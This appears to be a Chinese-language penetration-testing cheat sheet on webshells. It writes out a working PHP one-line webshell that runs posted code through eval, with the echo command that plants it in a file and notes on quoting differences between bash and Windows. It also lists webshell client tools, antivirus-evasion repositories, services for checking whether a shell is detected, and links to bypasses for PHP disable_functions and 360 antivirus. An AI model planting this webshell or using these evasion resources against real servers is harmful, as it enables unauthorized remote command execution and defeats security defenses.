# 01、echo写入PHP一句话木马
```
echo "<?php eval(\$_POST['cmd']);?>">1.php
```
1.php内容如下
```
<?php eval($_POST['cmd']);?>
```
#### 注意1
经过在burp下测试及bash下测试发现，执行如下命令后
```
echo "<?php eval($_POST['cmd']);?>">1.php
```
1.php的内容如下
```
<?php eval(['cmd']);?>
```
#### 注意2
windows下echo "bbb">3.txt时，会将双引号带入文件内容，linux下echo "bbb">3.txt时，不会将双引号带入文件内容。

# 02、Webshell免杀
```
https://github.com/AntSwordProject/antSword
https://github.com/rebeyond/Behinder
https://github.com/BeichenDream/Godzilla
https://github.com/shack2/skyscorpion
https://github.com/Chora10/Cknife

https://github.com/Tas9er/ByPassBehinder4J
https://github.com/cseroad/Webshell_Generate
https://github.com/G0mini/Bypass
http://bypass.tidesec.com/web/
https://github.com/czz1233/GBByPass

https://github.com/AabyssZG/WebShell-Bypass-Guide/tree/main
```
webshell免杀效果检测
```
https://n.shellpub.com/
https://ti.aliyun.com/#/webshell
https://sandbox.dbappsecurity.com.cn/
```

# 03、Webshell绕过Disable_Functions执行命令
```
https://github.com/mm0r1/exploits/tree/master/php-filter-bypass
```

# 04、Webshell下绕过360执行命令
```
Webshell绕过360主动防御执行命令
https://mp.weixin.qq.com/s/OGwo1zoN1LS3aYalZ_PePw
```